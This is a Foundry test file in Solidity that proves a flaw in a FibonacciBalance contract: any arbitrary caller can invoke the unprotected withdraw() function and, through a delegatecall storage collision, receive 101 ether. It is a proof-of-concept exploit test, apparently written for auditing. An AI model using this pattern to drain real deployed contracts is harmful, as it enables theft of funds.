
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {

    FibonacciBalance public fibonacciBalance;
    address public libAddress;

    function setUp() public {
        // Deploy the library implementation
        FibonacciLib libImpl = new FibonacciLib();
        
        // Etch the library at a low address to mitigate storage collision issues inherent in the target contract.
        // FibonacciBalance stores the library address at slot 0.
        // FibonacciLib reads 'start' from slot 0.
        // A standard deployment address would be interpreted as a huge 'start' value, causing overflow during ether calculation.
        // We use address(100) so 'start' is interpreted as 100.
        libAddress = address(100);
        vm.etch(libAddress, address(libImpl).code);

        // Deploy the target contract with sufficient ether to cover the withdrawal
        fibonacciBalance = new FibonacciBalance{value: 200 ether}(libAddress);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != libAddress);

        // Ensure caller is an EOA (or has no code) to accept ETH transfer without revert
        vm.assume(caller.code.length == 0);

        // --- 2. State Configuration ---
        // No additional state configuration needed beyond setUp.

        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // The withdraw function is public and lacks access control.
        // Any arbitrary caller can trigger it.
        fibonacciBalance.withdraw();
        
        // ASSERT SUCCESS
        // Logic trace:
        // 1. withdrawalCounter increments to 1.
        // 2. delegatecall to setFibonacci(1).
        // 3. Library reads slot 0 (address 100) as 'start' = 100.
        // 4. fibonacci(1) returns start + 1 = 101.
        // 5. Contract transfers 101 ether to caller.
        assertEq(caller.balance, 101 ether);
    }
}
